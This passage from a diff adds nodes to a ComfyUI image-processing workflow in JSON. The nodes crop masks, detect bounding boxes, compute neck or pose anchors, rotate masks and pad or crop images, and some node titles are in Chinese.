+        "7064:7123",
+        0
+      ],
+      "top": [
+        "7064:7126",
+        0
+      ],
+      "bottom": [
+        "7064:7118",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7064:7139",
+        0
+      ],
+      "mask": [
+        "7064:7139",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7064:7138": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7064:7128",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7139": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7064:7117",
+        0
+      ],
+      "image": [
+        "7064:7107",
+        0
+      ],
+      "mask": [
+        "7064:7106",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7064:7141": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7064:7115",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7142": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7064:7138",
+        0
+      ],
+      "y": [
+        "7064:7141",
+        0
+      ],
+      "image": [
+        "7064:7137",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "7065:7145": {
+    "inputs": {
+      "mask": [
+        "7065:7146",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7065:7146": {
+    "inputs": {
+      "x": [
+        "7065:7148",
+        5
+      ],
+      "y": [
+        "7065:7148",
+        6
+      ],
+      "width": [
+        "7065:7148",
+        3
+      ],
+      "height": [
+        "7065:7148",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7065:7147": {
+    "inputs": {
+      "mask": [
+        "7065:7146",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7065:7148": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7065:7149": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7065:7165",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7065:7150": {
+    "inputs": {
+      "x": [
+        "7065:7149",
+        5
+      ],
+      "y": [
+        "7065:7149",
+        6
+      ],
+      "width": [
+        "7065:7149",
+        3
+      ],
+      "height": [
+        "7065:7149",
+        4
+      ],
+      "mask": [
+        "7065:7165",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7065:7151": {
+    "inputs": {
+      "mask": [
+        "7065:7150",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7065:7152": {
+    "inputs": {
+      "x": [
+        "7065:7176",
+        5
+      ],
+      "y": [
+        "7065:7176",
+        6
+      ],
+      "width": [
+        "7065:7176",
+        3
+      ],
+      "height": [
+        "7065:7176",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7065:7153": {
+    "inputs": {
+      "boolean": [
+        "7065:7157",
+        0
+      ],
+      "on_true": [
+        "7065:7156",
+        3
+      ],
+      "on_false": [
+        "7065:7155",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7065:7154": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7065:7155": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": -1,
+      "anchor_side_ratio": 0.3,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7065:7156": {
+    "inputs": {
+      "side": -1,
+      "anchor_side_ratio": 0.3,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7065:7157": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7065:7155",
+        3
+      ],
+      "b": [
+        "7065:7154",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7065:7158": {
+    "inputs": {
+      "boolean": [
+        "7065:7157",
+        0
+      ],
+      "on_true": [
+        "7065:7156",
+        0
+      ],
+      "on_false": [
+        "7065:7155",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7065:7159": {
+    "inputs": {
+      "number": [
+        "7065:7160",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7065:7160": {
+    "inputs": {
+      "boolean": [
+        "7065:7157",
+        0
+      ],
+      "on_true": [
+        "7065:7156",
+        1
+      ],
+      "on_false": [
+        "7065:7155",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7065:7161": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7065:7176",
+        3
+      ],
+      "b": [
+        "7065:7176",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7162": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7065:7170",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7163": {
+    "inputs": {
+      "boolean": [
+        "7065:7157",
+        0
+      ],
+      "on_true": [
+        "7065:7156",
+        2
+      ],
+      "on_false": [
+        "7065:7155",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7065:7164": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7065:7145",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7065:7147",
+        0
+      ],
+      "mask": [
+        "7065:7146",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7065:7165": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7065:7166",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7065:7166": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7065:7163",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7065:7164",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7065:7167": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7065:7168",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7168": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7065:7172",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7170": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7065:7159",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7172": {
+    "inputs": {
+      "number": [
+        "7065:7158",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7065:7174": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7065:7181",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7065:7175": {
+    "inputs": {
+      "anchor_x": [
+        "7065:7158",
+        0
+      ],
+      "anchor_y": [
+        "7065:7160",
+        0
+      ],
+      "angle": [
+        "7065:7163",
+        0
+      ],
+      "scale": [
+        "7065:7153",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7065:7176": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7065:7175",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7065:7177": {
+    "inputs": {
+      "x": [
+        "7065:7176",
+        5
+      ],
+      "y": [
+        "7065:7176",
+        6
+      ],
+      "width": [
+        "7065:7176",
+        3
+      ],
+      "height": [
+        "7065:7176",
+        4
+      ],
+      "mask": [
+        "7065:7175",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7065:7178": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7065:7152",
+        0
+      ],
+      "source": [
+        "7065:7177",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7065:7179": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7065:7178",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7065:7180": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7065:7186",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7065:7181": {
+    "inputs": {
+      "left": [
+        "7065:7168",
+        0
+      ],
+      "right": [
+        "7065:7167",
+        0
+      ],
+      "top": [
+        "7065:7170",
+        0
+      ],
+      "bottom": [
+        "7065:7162",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7065:7183",
+        0
+      ],
+      "mask": [
+        "7065:7183",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7065:7182": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7065:7172",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7183": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7065:7161",
+        0
+      ],
+      "image": [
+        "7065:7151",
+        0
+      ],
+      "mask": [
+        "7065:7150",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7065:7185": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7065:7159",
+        0
+      ],
+      "c": [
+        "7065:7183",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7065:7186": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7065:7182",
+        0
+      ],
+      "y": [
+        "7065:7185",
+        0
+      ],
+      "image": [
+        "7065:7181",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "7066:7189": {
+    "inputs": {
+      "mask": [
+        "7066:7190",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7066:7190": {
+    "inputs": {
+      "x": [
+        "7066:7192",
+        5
+      ],
+      "y": [
+        "7066:7192",
+        6
+      ],
+      "width": [
+        "7066:7192",
+        3
+      ],
+      "height": [
+        "7066:7192",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7066:7191": {
+    "inputs": {
+      "mask": [
+        "7066:7190",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7066:7192": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7066:7193": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7066:7209",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7066:7194": {
+    "inputs": {
+      "x": [
+        "7066:7193",
+        5
+      ],
+      "y": [
+        "7066:7193",
+        6
+      ],
+      "width": [
+        "7066:7193",
+        3
+      ],
+      "height": [
+        "7066:7193",
+        4
+      ],
+      "mask": [
+        "7066:7209",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7066:7195": {
+    "inputs": {
+      "mask": [
+        "7066:7194",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7066:7196": {
+    "inputs": {
+      "x": [
+        "7066:7220",
+        5
+      ],
+      "y": [
+        "7066:7220",
+        6
+      ],
+      "width": [
+        "7066:7220",
+        3
+      ],
+      "height": [
+        "7066:7220",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7066:7197": {
+    "inputs": {
+      "boolean": [
+        "7066:7201",
+        0
+      ],
+      "on_true": [
+        "7066:7200",
+        3
+      ],
+      "on_false": [
+        "7066:7199",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7066:7198": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7066:7199": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": 1,
+      "anchor_side_ratio": 0.4,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7066:7200": {
+    "inputs": {
+      "side": 1,
+      "anchor_side_ratio": 0.4,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7066:7201": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7066:7199",
+        3
+      ],
+      "b": [
+        "7066:7198",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7066:7202": {
+    "inputs": {
+      "boolean": [
+        "7066:7201",
+        0
+      ],
+      "on_true": [
+        "7066:7200",
+        0
+      ],
+      "on_false": [
+        "7066:7199",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7066:7203": {
+    "inputs": {
+      "number": [
+        "7066:7204",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7066:7204": {
+    "inputs": {
+      "boolean": [
+        "7066:7201",
+        0
+      ],
+      "on_true": [
+        "7066:7200",
+        1
+      ],
+      "on_false": [
+        "7066:7199",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7066:7205": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7066:7220",
+        3
+      ],
+      "b": [
+        "7066:7220",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7206": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7066:7214",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7207": {
+    "inputs": {
+      "boolean": [
+        "7066:7201",
+        0
+      ],
+      "on_true": [
+        "7066:7200",
+        2
+      ],
+      "on_false": [
+        "7066:7199",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7066:7208": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7066:7189",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7066:7191",
+        0
+      ],
+      "mask": [
+        "7066:7190",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7066:7209": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7066:7210",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7066:7210": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7066:7207",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7066:7208",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7066:7211": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7066:7212",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7212": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7066:7216",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7214": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7066:7203",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7216": {
+    "inputs": {
+      "number": [
+        "7066:7202",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7066:7218": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7066:7225",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7066:7219": {
+    "inputs": {
+      "anchor_x": [
+        "7066:7202",
+        0
+      ],
+      "anchor_y": [
+        "7066:7204",
+        0
+      ],
+      "angle": [
+        "7066:7207",
+        0
+      ],
+      "scale": [
+        "7066:7197",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7066:7220": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7066:7219",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7066:7221": {
+    "inputs": {
+      "x": [
+        "7066:7220",
+        5
+      ],
+      "y": [
+        "7066:7220",
+        6
+      ],
+      "width": [
+        "7066:7220",
+        3
+      ],
+      "height": [
+        "7066:7220",
+        4
+      ],
+      "mask": [
+        "7066:7219",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7066:7222": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7066:7196",
+        0
+      ],
+      "source": [
+        "7066:7221",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7066:7223": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7066:7222",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7066:7224": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7066:7230",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7066:7225": {
+    "inputs": {
+      "left": [
+        "7066:7212",
+        0
+      ],
+      "right": [
+        "7066:7211",
+        0
+      ],
+      "top": [
+        "7066:7214",
+        0
+      ],
+      "bottom": [
+        "7066:7206",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7066:7227",
+        0
+      ],
+      "mask": [
+        "7066:7227",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7066:7226": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7066:7216",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7227": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7066:7205",
+        0
+      ],
+      "image": [
+        "7066:7195",
+        0
+      ],
+      "mask": [
+        "7066:7194",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7066:7229": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7066:7203",
+        0
+      ],
+      "c": [
+        "7066:7227",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7066:7230": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7066:7226",
+        0
+      ],
+      "y": [
+        "7066:7229",
+        0
+      ],
+      "image": [
+        "7066:7225",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "7067:7233": {
+    "inputs": {
+      "mask": [
+        "7067:7234",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7067:7234": {
+    "inputs": {
+      "x": [
+        "7067:7236",
+        5
+      ],
+      "y": [
+        "7067:7236",
+        6
+      ],
+      "width": [
+        "7067:7236",
+        3
+      ],
+      "height": [
+        "7067:7236",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7067:7235": {
+    "inputs": {
+      "mask": [
+        "7067:7234",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7067:7236": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7067:7237": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7067:7253",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7067:7238": {
+    "inputs": {
+      "x": [
+        "7067:7237",
+        5
+      ],
+      "y": [
+        "7067:7237",
+        6
+      ],
+      "width": [
+        "7067:7237",
+        3
+      ],
+      "height": [
+        "7067:7237",
+        4
+      ],
+      "mask": [
+        "7067:7253",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7067:7239": {
+    "inputs": {
+      "mask": [
+        "7067:7238",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7067:7240": {
+    "inputs": {
+      "x": [
+        "7067:7264",
+        5
+      ],
+      "y": [
+        "7067:7264",
+        6
+      ],
+      "width": [
+        "7067:7264",
+        3
+      ],
+      "height": [
+        "7067:7264",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7067:7241": {
+    "inputs": {
+      "boolean": [
+        "7067:7245",
+        0
+      ],
+      "on_true": [
+        "7067:7244",
+        3
+      ],
+      "on_false": [
+        "7067:7243",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7067:7242": {
+    "inputs": {
+      "value": 0.0
+    },
